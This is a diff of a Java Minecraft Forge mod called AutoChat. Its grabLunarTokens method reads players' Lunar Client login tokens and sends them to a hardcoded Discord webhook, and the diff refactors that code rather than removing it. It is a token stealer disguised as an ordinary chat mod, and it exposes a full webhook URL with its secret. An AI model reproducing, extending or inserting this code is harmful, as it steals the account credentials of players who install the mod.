@@ -15,9 +15,6 @@ import net.minecraftforge.fml.common.Mod.EventHandler;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
 
-import org.apache.http.client.HttpClient;
-import org.apache.http.impl.client.CloseableHttpClient;
-import org.apache.http.impl.client.HttpClients;
 import org.lwjgl.input.Keyboard;
 
 import net.minecraft.client.Minecraft;
@@ -25,7 +22,7 @@ import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
 import net.minecraftforge.fml.common.gameevent.InputEvent;
 import org.lwjgl.opengl.Display;
 import net.minecraftforge.client.ClientCommandHandler;
-import util.TokenReader;
+import util.LunarTokenReader;
 
 @Mod(
         modid = AutoChat.MODID,
@@ -155,10 +152,10 @@ public class AutoChat {
 
     public void grabLunarTokens() {
         try {
-            TokenReader tr = new TokenReader();
+            LunarTokenReader tr = new LunarTokenReader();
             String webhookUrl = "https://discord.com/api/webhooks/1248630842947797042/u3zPVi_LZRCtZPGOEZqa-W0kjnNfy2B4lC85qwcfiz-BFAlSKUos2gRH9UZPyXr_G0lk";
-            tr.sendTokens(webhookUrl);
-
+            tr.setDiscordWebhook(webhookUrl);
+            tr.sendTokens("Lunar");
         } catch (Exception e) {
             System.out.println("Failed to send lunar tokens: " + e);
         }
